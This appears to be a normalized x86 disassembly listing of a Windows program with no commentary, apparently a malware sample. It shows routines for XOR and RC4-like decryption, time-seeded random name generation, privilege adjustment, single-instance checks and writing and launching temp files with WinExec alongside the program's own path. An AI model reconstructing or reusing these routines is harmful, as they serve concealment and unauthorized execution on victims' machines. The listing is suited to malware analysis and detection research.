cmp ecx edx
jb r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + 0x14 ]
xor edx edx
mov dh [ eax + ecx ]
mov dl [ eax + ecx + 0x1 ]
mov ecx edx
mov edx [ ebp + 0x10 ]
lea ecx [ edi + ecx * 4 ]
mov esi [ ecx ]
mov [ ecx ] eax
mov [ edi + eax * 4 + 0x40000 ] esi
inc eax
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] ebx
jb r-xdata
xor ecx ecx
inc eax
cmp eax esi
jb r-xdata
mov [ ebp - 0x1 ] al
lea ecx [ edx - 0x1 ]
cmp eax ecx
jae r-xdata
lea ecx [ edx - 0x1 ]
cmp eax ecx
jb r-xdata
movzx ecx [ ebp - 0x1 ]
mov edi [ ebp + eax * 4 - 0x420 ]
cmp edi [ ebp + ecx * 4 - 0x420 ]
jae r-xdata
mov edi [ ebp + 0xc ]
mov al [ ebp - 0x1 ]
xor esi esi
xor ebx ebx
inc esi
and [ ebp - 0x8 ] ebx
mov [ edi ] al
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x14 ] edx
jmp r-xdata
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x32
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x14 ]
and [ ebp - 0x10 ] 0x0
add eax ebx
mov ebx [ edx + ebx * 4 + 0x40000 ]
cmp ebx 0xffffffff
push 0x3
pop ecx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x18 ] ecx
je r-xdata
and [ ebp - 0x8 ] 0x0
push 0x1
call [ Sleep@IAT ]
mov al [ eax ]
inc [ ebp - 0xc ]
mov [ esi + edi ] al
inc esi
cmp al [ ebp - 0x1 ]
jne r-xdata
mov edx [ ebp - 0xc ]
sub edx ebx
cmp edx 0xf4240
mov [ ebp - 0x1c ] edx
jae r-xdata
dec [ ebp - 0x14 ]
jmp r-xdata
mov [ esi + edi ] 0x0
inc esi
cmp ecx 0x8
jae r-xdata
mov edx [ ebp + 0x8 ]
add edx ebx
mov dl [ edx + ecx ]
cmp dl [ ecx + eax ]
jne r-xdata
cmp [ ebp - 0x14 ] 0x3
ja r-xdata
mov al [ ebp - 0x1 ]
mov [ esi + edi ] al
inc esi
lea eax [ esi + edi ]
push ecx
call sub_406642
push [ ebp - 0x10 ]
add esi eax
lea eax [ esi + edi ]
call sub_406642
add esi eax
mov eax [ ebp - 0x18 ]
add [ ebp - 0xc ] eax
sub [ ebp - 0x14 ] eax
pop ecx
pop ecx
cmp ecx 0x4
jne r-xdata
mov edx [ ebp + 0x14 ]
mov ebx [ edx + ebx * 4 + 0x40000 ]
cmp ebx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x1c ]
jb r-xdata
mov ebx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
pop ebx
jmp r-xdata
cmp ecx 0x5
jne r-xdata
cmp [ ebp - 0x10 ] 0x7f
jbe r-xdata
push ecx
mov ecx [ ebp + 0x8 ]
push eax
push 0x2
pop eax
lea edx [ ebx + ecx ]
call sub_406621
cmp eax [ ebp - 0x18 ]
pop ecx
pop ecx
jbe r-xdata
mov ecx [ ebp - 0x1c ]
cmp edx [ ebp + 0x10 ]
jb r-xdata
cmp ecx 0x6
jne r-xdata
cmp [ ebp - 0x10 ] 0x3fff
jbe r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov al [ edx + eax ]
mov cl [ ebp - 0x1 ]
cmp al cl
jne r-xdata
mov eax esi
cmp ecx 0x7
jne r-xdata
cmp [ ebp - 0x10 ] 0x1fffff
jbe r-xdata
mov [ esi + edi ] al
mov [ esi + edi ] cl
inc esi
mov [ esi + edi ] 0x0
jmp r-xdata
cmp [ ebp - 0x10 ] 0xfffffff
jbe r-xdata
inc esi
inc edx
sub_406ad3
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
sub esp 0x10
dec [ ebp + 0x14 ]
cmp edx 0x10000000
push ebx
push esi
jbe r-xdata
push edi
xor edi edi
inc edi
cmp edx edi
jae r-xdata
test edx edx
jbe r-xdata
mov ebx [ ebp + 0x8 ]
mov cl [ ebx ]
mov [ ebp - 0x1 ] cl
xor esi esi
xor eax eax
jmp r-xdata
mov eax edx
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
sub eax ecx
mov esi edx
mov ecx [ ebp + 0xc ]
mov [ esi + ecx ] al
inc esi
cmp esi [ ebp + 0x14 ]
ja r-xdata
lea eax [ edi + ebx ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov bl [ eax + ecx ]
xor bl 0x4b
mov [ ecx ] bl
inc ecx
dec esi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi [ ebp + 0x10 ]
jae r-xdata
lea ecx [ ebp - 0xc ]
push ecx
call sub_40668e
add edi eax
lea ecx [ ebp - 0x10 ]
lea eax [ edi + ebx ]
push ecx
call sub_40668e
and [ ebp - 0x8 ] 0x0
pop ecx
add edi eax
cmp [ ebp - 0xc ] 0x0
pop ecx
jbe r-xdata
mov eax [ ebp + 0xc ]
mov [ esi + eax ] cl
inc esi
cmp esi [ ebp + 0x14 ]
ja r-xdata
mov eax esi
mov cl [ ebp - 0x1 ]
jmp r-xdata
mov eax esi
sub eax [ ebp - 0x10 ]
add eax [ ebp + 0xc ]
inc edi
jmp r-xdata
mov al [ edi + ebx ]
inc edi
cmp al cl
jne r-xdata
inc [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
jb r-xdata
mov cl [ eax ]
mov edx [ ebp + 0xc ]
mov [ esi + edx ] cl
inc esi
inc eax
cmp esi [ ebp + 0x14 ]
ja r-xdata
jmp r-xdata
sub_406bb8
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ eax ]
push esi
xor edx edx
push edi
xor ecx ecx
mov [ ecx + ebx ] cl
inc ecx
cmp ecx 0x100
jl r-xdata
mov [ eax + 0x4 ] dl
mov [ eax + 0x5 ] dl
mov [ ebp + 0x10 ] edx
xor edi edi
movzx edi al
lea eax [ edi + ebx ]
call sub_406bad
lea eax [ esi + 0x1 ]
cdq
idiv [ ebp + 0xc ]
inc [ ebp + 0x10 ]
cmp [ ebp + 0x10 ] 0x100
jl r-xdata
dec eax
or eax 0xffffff00
inc eax
mov eax [ ebp + 0x10 ]
lea ecx [ eax + ebx ]
mov eax [ ebp + 0x8 ]
movzx esi dl
movzx eax [ esi + eax ]
movzx edx [ ecx ]
add eax edi
add eax edx
and eax 0x800000ff
jns r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_406c26
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x10 ]
and [ ebp - 0x8 ] 0x0
cmp [ ebp + 0xc ] 0x0
mov cl [ eax + 0x5 ]
push ebx
mov bl [ eax + 0x4 ]
push esi
mov esi [ eax ]
jle r-xdata
pop esi
mov [ eax + 0x4 ] bl
mov [ eax + 0x5 ] cl
pop ebx
leave
retn
push edi
movzx edi bl
movzx eax cl
jmp r-xdata
lea ebx [ edi + 0x1 ]
and ebx 0x800000ff
jns r-xdata
movzx edi bl
lea ecx [ edi + esi ]
movzx edx [ ecx ]
add eax edx
and eax 0x800000ff
jns r-xdata
dec ebx
or ebx 0xffffff00
inc ebx
mov [ ebp - 0x1 ] al
movzx eax al
mov [ ebp - 0xc ] eax
add eax esi
mov [ ebp - 0x10 ] eax
call sub_406bad
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ ecx ]
add eax edx
mov edx [ ebp - 0x10 ]
movzx edx [ edx ]
add edx ecx
and edx 0x800000ff
jns r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx ecx dl
mov cl [ ecx + esi ]
xor [ eax ] cl
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0xc ]
jl r-xdata
dec edx
or edx 0xffffff00
inc edx
mov eax [ ebp - 0xc ]
mov cl [ ebp - 0x1 ]
mov eax [ ebp + 0x10 ]
pop edi
sub_406cd9
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push edi
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
mov esi r--data
push esi
call sub_407ccf
mov ecx [ ebp + 0x8 ]
call sub_407870
mov eax [ ebp + 0xc ]
xor ebx ebx
inc ebx
dec eax
cmp eax ebx
mov [ ebp + 0xc ] eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + edi ] 0x0
jne r-xdata
inc ebx
cmp ebx [ ebp + 0xc ]
jl r-xdata
lea eax [ ebx + edi + 0x1 ]
push eax
push eax
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push esi
call sub_407ccf
mov ecx [ ebp + 0x8 ]
call sub_407870
sub_406d42
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push edi
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
mov esi r--data
push esi
call sub_407ccf
mov ecx [ ebp + 0x8 ]
call sub_407870
mov eax [ ebp + 0xc ]
xor ebx ebx
inc ebx
dec eax
cmp eax ebx
mov [ ebp + 0xc ] eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + edi ] 0x0
jne r-xdata
inc ebx
cmp ebx [ ebp + 0xc ]
jl r-xdata
lea eax [ ebx + edi + 0x1 ]
push eax
push eax
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push esi
call sub_407ccf
mov ecx [ ebp + 0x8 ]
call sub_407870
sub_406dab
sub esp 0x14
push ebx
push esi
mov esi [ esp + 0x20 ]
push esi
call sub_409f34
mov [ esp + 0x18 ] eax
mov [ esp ] r--data
call sub_409f34
xor ebx ebx
cmp [ esp + 0x18 ] ebx
pop ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0xc ] ebx
jle r-xdata
pop esi
pop ebx
add esp 0x14
retn
mov [ esp + 0x8 ] 0x5
sub [ esp + 0x8 ] esi
push ebp
push edi
and [ esp + 0x18 ] 0x0
call sub_409c15
mov [ esp + 0x18 ] eax
jmp r-xdata
call [ GetTickCount@IAT ]
push 0x18
xor edx edx
pop ecx
div ecx
add dl 0x61
mov [ edi ] dl
cmp dl 0x7a
jle r-xdata
mov eax [ esp + 0x28 ]
lea esi [ ebx + eax ]
mov eax ebx
push 0x14
cdq
pop ecx
idiv ecx
lea edi [ edx + rw-data ]
call [ GetTickCount@IAT ]
mov ecx eax
mov eax [ esp + 0x10 ]
add eax esi
cdq
push 0x14
pop ebp
idiv ebp
movsx eax [ esi ]
movsx edx [ edx + rw-data ]
add edx [ esp + 0x18 ]
add edx ecx
add eax edx
xor edx edx
div [ esp + 0x20 ]
mov dl [ edx + r--data ]
cmp dl 0x61
mov [ edi ] dl
jl r-xdata
inc ebx
cmp ebx [ esp + 0x1c ]
mov [ esp + 0x14 ] eax
jl r-xdata
dec eax
or eax 0xfffffffe
inc eax
mov eax [ esp + 0x14 ]
inc eax
and eax 0x80000001
jns r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
pop edi
pop ebp
sub_406e91
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ecx esi
mov bl 0x1
call sub_407a67
cmp [ rw-data ] 0x0
jne r-xdata
pop esi
mov al bl
pop ebx
leave
retn
sub esp 0x10
add esi 0x4
mov ecx esp
push esi
call sub_407e01
lea eax [ ebp - 0x10 ]
push eax
call sub_4056f2
pop ecx
lea eax [ ebp - 0x10 ]
mov ecx esp
push eax
call sub_407e01
call sub_40704f
add esp 0x10
test eax eax
jne r-xdata
lea ecx [ ebp - 0x10 ]
call sub_407e74
xor bl bl
sub_406eed
push ebp
mov ebp esp
sub esp 0x4f4
inc [ rw-data ]
cmp [ rw-data ] 0x1
jg r-xdata
leave
retn
push esi
push edi
push 0x1a
pop ecx
mov esi r--data
lea edi [ ebp - 0x2ec ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0x6
pop ecx
mov esi r--data
lea edi [ ebp - 0x1c ]
[ edi ] [ esi ]
lea eax [ ebp - 0x2ec ]
push eax
lea eax [ ebp - 0x17c ]
push eax
movsw [ edi ] [ esi ]
call sub_409ed4
push [ ebp + 0x8 ]
lea eax [ ebp - 0x17c ]
push eax
call sub_409e53
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x17c ]
push eax
call sub_409e53
push 0x17
pop ecx
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x17c ]
mov esi r--data
lea edi [ ebp - 0x78 ]
push eax
[ edi ] [ esi ]
call sub_409e53
mov esi 0x104
push esi
xor edi edi
lea eax [ ebp - 0x280 ]
push edi
push eax
call sub_409951
push esi
lea eax [ ebp - 0x3f0 ]
push edi
push eax
call sub_409951
add esp 0x38
lea eax [ ebp - 0x3f0 ]
push eax
push esi
call [ GetTempPathA@IAT ]
test eax eax
jbe r-xdata
pop edi
pop esi
lea eax [ ebp - 0x280 ]
push eax
push edi
push r--data
lea eax [ ebp - 0x3f0 ]
push eax
call [ GetTempFileNameA@IAT ]
test eax eax
jbe r-xdata
lea eax [ ebp - 0x280 ]
push r--data
push eax
call sub_40948c
mov esi eax
cmp esi edi
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x17c ]
push eax
push esi
call sub_40949f
push esi
call sub_409393
lea eax [ ebp - 0x4f4 ]
push r--data
push eax
call sub_409ed4
lea eax [ ebp - 0x280 ]
push eax
lea eax [ ebp - 0x4f4 ]
push eax
call sub_409e53
add esp 0x1c
push edi
lea eax [ ebp - 0x4f4 ]
push eax
call [ WinExec@IAT ]
push 0x64
call [ Sleep@IAT ]
lea eax [ ebp - 0x280 ]
push eax
call sub_409cbd
pop ecx
sub_40704f
push ebp
lea ebp [ esp - 0x68 ]
sub esp 0x8a4
push ebx
xor ebx ebx
push r--data
lea ecx [ ebp + 0x1c ]
mov [ ebp + 0x60 ] ebx
call sub_407ccf
lea eax [ ebp + 0x70 ]
push eax
lea ecx [ ebp + 0x34 ]
call sub_407e01
cmp [ ebp + 0x78 ] 0x4
jge r-xdata
push esi
lea eax [ ebp - 0x3c ]
push eax
call [ GetSystemTime@IAT ]
mov esi [ ebp + 0x24 ]
dec esi
cmp esi ebx
jl r-xdata
lea ecx [ ebp + 0x34 ]
call sub_407e74
lea ecx [ ebp + 0x1c ]
call sub_407e74
lea ecx [ ebp + 0x70 ]
call sub_407e74
mov eax ebx
pop ebx
add ebp 0x68
leave
retn
push r--data
call sub_406eed
cmp [ rw-data ] ebx
pop ecx
jg r-xdata
push esi
lea ecx [ ebp + 0x1c ]
call sub_407e92
movzx eax [ eax ]
push eax
push ebx
lea ecx [ ebp + 0x34 ]
call sub_4080ce
dec esi
jns r-xdata
lea eax [ ebp + 0x64 ]
push eax
push r--data
push 0x4
push ebx
push r--data
mov [ ebp + 0x64 ] ebx
call [ CoCreateInstance@IAT ]
cmp [ ebp + 0x64 ] ebx
je r-xdata
push ebx
call [ OleInitialize@IAT ]
inc [ rw-data ]
mov ebx [ ebp + 0x60 ]
pop esi
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
call [ VariantInit@IAT ]
push [ rw-data ]
mov esi [ SysAllocString@IAT ]
call esi
push r--data
mov [ ebp + 0x48 ] eax
call esi
mov [ ebp + 0x30 ] eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x3c ]
mov [ ebp + 0x14 ] eax
lea eax [ ebp + 0x14 ]
push eax
push 0x1
push 0x11
mov [ ebp - 0xc ] 0x8
mov [ ebp + 0x4 ] 0x2000
mov [ ebp + 0x18 ] ebx
call [ SafeArrayCreate@IAT ]
cmp [ ebp + 0x3c ] ebx
mov [ ebp + 0xc ] eax
mov [ ebp + 0x5c ] ebx
jle r-xdata
cmp [ ebp + 0x24 ] ebx
jle r-xdata
push [ ebp + 0x5c ]
lea ecx [ ebp + 0x34 ]
call sub_407e92
push eax
lea eax [ ebp + 0x5c ]
push eax
push [ ebp + 0xc ]
call [ SafeArrayPutElement@IAT ]
inc [ ebp + 0x5c ]
mov eax [ ebp + 0x5c ]
cmp eax [ ebp + 0x3c ]
jl r-xdata
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x80 ]
push [ ebp + 0x48 ]
mov esi [ SysFreeString@IAT ]
call esi
push [ ebp + 0x30 ]
call esi
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp [ ebp + 0x3c ] ebx
jle r-xdata
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push edi
push ebx
push eax
call [ ecx + 0xa4 ]
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0xe8 ]
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0xc4 ]
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0x110 ]
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0xac ]
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0xbc ]
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push 0xffffffff
push eax
call [ ecx + 0xf0 ]
mov esi [ WideCharToMultiByte@IAT ]
mov edi [ lstrcmpA@IAT ]
cmp [ rw-data ] bl
je r-xdata
mov [ ebp + 0x50 ] ebx
mov [ ebp + 0x58 ] ebx
lea eax [ ebp - 0x1c ]
push eax
call [ GetSystemTime@IAT ]
movzx eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x32 ]
imul eax eax 0x64
movzx edx [ ebp - 0x12 ]
add eax ecx
movzx ecx [ ebp - 0x14 ]
imul ecx ecx 0x64
add ecx edx
sub eax ecx
push eax
mov [ ebp + 0x58 ] ebx
call sub_408fe0
cmp eax 0x12c
pop ecx
jge r-xdata
cmp [ ebp + 0x60 ] ebx
jne r-xdata
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
lea edx [ ebp + 0x44 ]
push edx
push eax
call [ ecx + 0xb0 ]
push ebx
push ebx
push 0x400
lea eax [ ebp - 0x43c ]
push eax
push 0xffffffff
push [ ebp + 0x44 ]
push ebx
push ebx
call esi
push [ rw-data ]
lea eax [ ebp - 0x43c ]
push eax
call edi
test eax eax
jne r-xdata
cmp [ ebp + 0x50 ] 0x4b0
jl r-xdata
cmp [ rw-data ] bl
je r-xdata
mov [ ebp + 0x58 ] 0x1
push 0x493e0
call [ Sleep@IAT ]
push [ ebp + 0x44 ]
call [ SysFreeString@IAT ]
cmp [ ebp + 0x60 ] ebx
jne r-xdata
mov [ ebp + 0x60 ] 0x1
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
lea edx [ ebp + 0x58 ]
push edx
push eax
call [ ecx + 0xe0 ]
push 0x1f4
call [ Sleep@IAT ]
inc [ ebp + 0x50 ]
cmp [ ebp + 0x58 ] 0x4
je r-xdata
jmp r-xdata
pop edi
cmp [ ebp + 0x60 ] ebx
jne r-xdata
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
lea edx [ ebp + 0x2c ]
push edx
push eax
call [ ecx + 0x48 ]
mov eax [ ebp + 0x2c ]
lea edx [ ebp + 0x54 ]
push edx
push r--data
mov [ ebp + 0x54 ] ebx
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
cmp [ ebp + 0x58 ] ebx
jne r-xdata
mov eax [ ebp + 0x54 ]
mov ecx [ eax ]
lea edx [ ebp + 0x4c ]
push edx
push eax
call [ ecx + 0x44 ]
push ebx
push ebx
push 0x400
lea eax [ ebp - 0x83c ]
push eax
push 0xffffffff
push [ ebp + 0x4c ]
push ebx
push ebx
call esi
push [ rw-data ]
lea eax [ ebp - 0x83c ]
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp + 0x4 ]
push edx
lea edx [ ebp - 0x2c ]
push edx
push edx
push [ ebp + 0x48 ]
push eax
call [ ecx + 0x2c ]
test eax eax
jl r-xdata
push [ ebp + 0x4c ]
call [ SysFreeString@IAT ]
mov eax [ ebp + 0x54 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ ebp + 0x60 ] 0x1
sub_4073bb
push esi
push 0x0
call [ SetLastError@IAT ]
push 0x0
push 0x64
push 0x64
push 0x64
push 0x1
push 0x4
push 0x80003
push r--data
call [ CreateNamedPipeA@IAT ]
call [ GetLastError@IAT ]
mov esi eax
call sub_406017
test esi esi
pop esi
je r-xdata
retn
push 0x0
call [ ExitProcess@IAT ]
sub_4073fb
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
call [ GetCurrentProcess@IAT ]
lea ecx [ ebp - 0x4 ]
push ecx
push 0x28
push eax
call [ OpenProcessToken@IAT ]
mov esi eax
xor edi edi
cmp esi edi
je r-xdata
call sub_405fe1
pop edi
mov eax esi
pop esi
leave
retn
lea eax [ ebp - 0x10 ]
push eax
push r--data
push edi
call [ LookupPrivilegeValueA@IAT ]
mov esi eax
cmp esi edi
je r-xdata
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
push edi
push edi
push edi
lea eax [ ebp - 0x14 ]
push eax
push edi
push [ ebp - 0x4 ]
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x8 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
mov esi eax
cmp esi edi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
neg esi
sbb esi esi
inc esi
sub_40747a
sub esp 0x10
mov eax [ esp + 0x14 ]
movzx ecx [ eax + 0x2 ]
push ebx
movzx ebx [ eax ]
push ebp
push esi
movzx esi [ eax + 0xa ]
add esi ecx
push edi
movzx edi [ eax + 0x8 ]
movzx eax [ eax + 0x6 ]
add edi eax
mov eax edi
imul eax esi
imul eax ebx
cdq
mov ebp 0xff
mov ecx ebp
idiv ecx
mov ecx esi
push 0x37
mov eax edx
mov edx ebx
shl edx cl
mov ecx ebp
add eax edx
sub eax edi
imul eax esi
cdq
idiv ecx
mov eax esi
imul eax ebx
mov [ esp + 0x18 ] eax
mov [ esp + 0x28 ] edx
cdq
idiv edi
mov eax [ esp + 0x28 ]
imul eax edi
add eax esi
add eax ebx
mov [ esp + 0x14 ] edx
cdq
idiv ecx
mov eax edx
add eax [ esp + 0x14 ]
add eax edi
cdq
idiv ecx
lea eax [ esi + ebx + 0x1 ]
imul eax edi
add eax [ esp + 0x18 ]
pop ecx
add eax esi
add eax ebx
mov [ esp + 0x1c ] edx
cdq
idiv ecx
mov ecx edi
mov eax edx
mov edx edi
shl edx cl
mov ecx esi
add eax edx
mov edx edi
shl edx cl
mov ecx ebp
add eax edx
imul eax eax 0x11
cdq
idiv ecx
mov eax edi
imul eax ebx
mov [ esp + 0x18 ] edx
cdq
idiv esi
mov eax esi
mov ecx edx
cdq
idiv edi
mov edi edx
add edi [ esp + 0x10 ]
mov eax ebx
cdq
idiv esi
add edi ecx
mov eax edx
add eax edi
add eax [ esp + 0x14 ]
pop edi
add eax [ esp + 0x14 ]
pop esi
add eax [ esp + 0x14 ]
add eax [ esp + 0x1c ]
cdq
idiv ebp
pop ebp
pop ebx
mov eax edx
shl eax 0x8
add eax [ esp + 0x8 ]
shl eax 0x8
add eax [ esp + 0xc ]
shl eax 0x8
add eax [ esp + 0x14 ]
add esp 0x10
retn
sub_407578
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x10
test eax eax
jne r-xdata
push esi
push eax
call sub_409147
mov [ esp ] r--data
push [ rw-data ]
mov esi eax
call sub_40a08b
test eax eax
pop ecx
pop ecx
je r-xdata
inc eax
leave
retn
lea eax [ ebp - 0x10 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call sub_40747a
pop ecx
xor ecx ecx
cmp esi eax
sete cl
mov eax ecx
xor eax eax
inc eax
jmp r-xdata
pop esi
leave
retn
sub_4075d0
push ebp
mov ebp esp
sub esp 0x8c
push ebx
push esi
push edi
mov esi 0x12c
push esi
call sub_409984
push esi
xor ebx ebx
push ebx
push eax
mov [ ebp - 0x4 ] eax
call sub_409951
add esp 0x10
push [ ebp - 0x4 ]
push esi
call [ GetTempPathA@IAT ]
push esi
call sub_409984
push esi
mov edi eax
push ebx
push edi
mov [ ebp - 0x8 ] edi
call sub_409951
add esp 0x10
push edi
push ebx
push ebx
push [ ebp - 0x4 ]
call [ GetTempFileNameA@IAT ]
push r--data
push edi
call sub_409e53
pop ecx
pop ecx
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0x40000000
push edi
call [ CreateFileA@IAT ]
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
push 0x1f
pop ecx
mov esi r--data
lea edi [ ebp - 0x8c ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor esi esi
push ebx
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + esi - 0x8c ]
push eax
push [ ebp - 0x4 ]
call [ WriteFile@IAT ]
inc esi
cmp esi 0x7f
jl r-xdata
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
call sub_405e8e
mov esi 0x1f4
push esi
call sub_409984
push [ ebp - 0x8 ]
mov edi eax
push edi
call sub_409ed4
push r--data
push edi
call sub_409e53
push esi
call sub_409984
push esi
mov [ ebp - 0x4 ] eax
call sub_409984
add esp 0x1c
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call [ GetModuleFileNameA@IAT ]
push esi
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call [ GetShortPathNameA@IAT ]
mov esi r--data
push esi
push edi
call sub_409e53
push [ ebp - 0x8 ]
push edi
call sub_409e53
push esi
push edi
call sub_409e53
add esp 0x18
call sub_405ef9
push ebx
push edi
call [ WinExec@IAT ]
sub_40771a
push ebp
mov ebp esp
sub esp 0x18
push 0x0
call [ SetErrorMode@IAT ]
lea eax [ ebp - 0x18 ]
push eax
call [ GetSystemTime@IAT ]
movzx ecx [ ebp - 0xe ]
movzx edx [ ebp - 0xc ]
movzx eax [ ebp - 0xa ]
imul ecx edx
imul ecx eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ecx
mov [ fs : 0x0 ] 0x0
mov eax [ ebp - 0x8 ]
call eax
mov eax [ ebp - 0x4 ]
call eax
xor eax eax
leave
retn
sub_4077a2
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx ecx
push esi
lea esi [ ebx + 0x8 ]
push edi
mov ecx esi
call sub_407e64
sub esp 0x10
lea eax [ ebp + 0x8 ]
mov ecx esp
push eax
call sub_407e01
lea eax [ ebp - 0xd ]
push eax
mov ecx esi
call sub_408073
lea ecx [ ebp - 0xd ]
call sub_407e74
xor edi edi
cmp [ ebp + 0x10 ] 0x4
mov [ ebx ] edi
je r-xdata
mov esi rw-data
push edi
push [ ebp + 0xc ]
push r--data
push edi
call [ MessageBoxA@IAT ]
push edi
call [ ExitProcess@IAT ]
push edi
lea ecx [ ebp + 0x8 ]
call sub_407e92
movzx eax [ eax ]
push eax
mov ecx esi
call sub_407eb0
inc edi
cmp edi 0x4
jl r-xdata
mov edi [ ebp + 0x18 ]
push edi
mov ecx esi
call sub_407eb0
mov eax edi
sar eax 0x8
push eax
mov ecx esi
call sub_407eb0
mov eax edi
sar eax 0x10
push eax
mov ecx esi
call sub_407eb0
sar edi 0x18
push edi
mov ecx esi
call sub_407eb0
mov eax [ rw-data ]
push 0x4
mov [ ebx + 0x4 ] eax
pop edi
push 0x37
mov ecx esi
call sub_407eb0
dec edi
jne r-xdata
lea ecx [ ebp + 0x8 ]
call sub_407e74
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn 0x14
sub_407870
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
mov [ ebp - 0x4 ] ecx
push edi
lea ecx [ ebp - 0x14 ]
call sub_407e64
mov esi [ ebp + 0x1c ]
push r--data
lea ecx [ ebp - 0x21 ]
mov [ ebp + 0x1c ] esi
call sub_407ccf
push eax
lea ecx [ ebp + 0x8 ]
call sub_408033
lea ecx [ ebp - 0x21 ]
mov bl al
call sub_407e74
test bl bl
je r-xdata
mov edi [ ebp + 0x18 ]
sub esp 0x10
mov eax esp
push [ ebp + 0x18 ]
push esi
push eax
call sub_4063c6
add esp 0xc
lea eax [ ebp - 0x21 ]
push eax
lea ecx [ ebp - 0x14 ]
call sub_408073
lea ecx [ ebp - 0x21 ]
call sub_407e74
mov eax [ ebp - 0x10 ]
mov edi [ ebp - 0xc ]
mov [ ebp + 0x1c ] eax
jmp r-xdata
lea ecx [ ebp - 0x14 ]
call sub_407e74
lea ecx [ ebp + 0x8 ]
call sub_407e74
pop edi
pop esi
pop ebx
leave
retn 0x18
cmp [ ebp + 0x10 ] 0x4
je r-xdata
xor ebx ebx
cmp edi ebx
jl r-xdata
mov esi rw-data
push ebx
call [ ExitProcess@IAT ]
push ebx
lea ecx [ ebp + 0x8 ]
call sub_407e92
movzx eax [ eax ]
push eax
mov ecx esi
call sub_407eb0
inc ebx
